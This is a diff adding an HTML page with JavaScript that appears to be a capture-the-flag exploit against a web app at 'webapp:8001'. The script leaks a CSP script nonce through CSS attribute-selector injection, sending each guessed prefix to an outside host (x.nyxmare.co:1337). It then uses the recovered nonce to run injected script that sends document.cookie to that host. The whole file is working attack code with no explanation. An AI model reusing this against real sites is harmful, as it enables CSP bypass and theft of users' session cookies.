@@ -1,0 +1,62 @@
+<img src="//x.nyxmare.co/sleep.php">
+<script>
+    var nonce = "";
+    const sleep = (ms) => {
+      return new Promise((r) => setTimeout(r, ms));
+    };
+  
+    const check = async () => {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+          if (this.responseText != "") {
+            nonce = this.responseText;
+          }
+          var src = "http://webapp:8001/#";
+          var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+  
+          src += "<style>script { display: block }";
+          for (var i = 0; i < 36; i++) {
+            for (var x = 0; x < 36; x++) {
+              // for (var y = 0; y < 36; y++) {
+              src +=
+                "" +
+                "script[nonce^='" +
+                nonce +
+                chars.charAt(i) +
+                chars.charAt(x) /*+ chars.charAt(y)*/ +
+                "']:after{" +
+                "content: url('http://x.nyxmare.co:1337/leak?q=" +
+                chars.charAt(i) +
+                chars.charAt(x) /*+ chars.charAt(y)*/ +
+                "')" +
+                "}" +
+                "";
+              // }
+            }
+          }
+          src += "</style>";
+  
+          if (nonce.length == 16) {
+            src =
+              "http://webapp:8001/#<iframe srcdoc='<script nonce=\"" +
+              nonce +
+              '">window.location.href=(`//x.nyxmare.co:1337/cookies?${document.cookie}`)<' +
+              "/script>'></iframe>";
+          }
+          window.open(src, "nyx");
+          console.log(src);
+        }
+      };
+      await sleep(500);
+      xhttp.open("GET", "http://x.nyxmare.co:1337/leak", true);
+      xhttp.send();
+    };
+  
+    (async () => {
+      while (1) {
+        check();
+        await sleep(500);
+      }
+    })();
+  </script>
